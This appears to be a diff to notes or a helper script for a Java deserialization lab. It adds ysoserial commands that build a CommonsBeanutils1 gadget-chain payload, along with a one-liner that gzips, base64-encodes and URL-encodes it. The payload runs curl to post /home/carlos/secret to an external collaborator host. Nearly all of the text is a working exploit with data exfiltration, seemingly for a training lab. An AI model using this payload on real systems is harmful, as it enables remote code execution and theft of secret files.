@@ -100,3 +100,10 @@ import sys, urllib.parse
 data = sys.stdin.read().strip()
 print(urllib.parse.quote(data, safe=''))
 "
+alternatively use this 
+
+ysoserial CommonsBeanutils1 'curl -d @/home/carlos/secret http://YOUR-COLLABORATOR-ID.oastify.com'
+gzip -c /tmp/payload.bin | base64 -w 0 | python3 -c "import sys, urllib.parse; print(urllib.parse.quote(sys.stdin.read().strip(), safe=''))"
+
+one liner
+ysoserial CommonsBeanutils1 'curl -d @/home/carlos/secret http://YOUR-COLLABORATOR-ID.oastify.com' >/dev/null && gzip -c /tmp/payload.bin | base64 -w 0 | python3 -c "import sys, urllib.parse; print(urllib.parse.quote(sys.stdin.read().strip(), safe=''))"
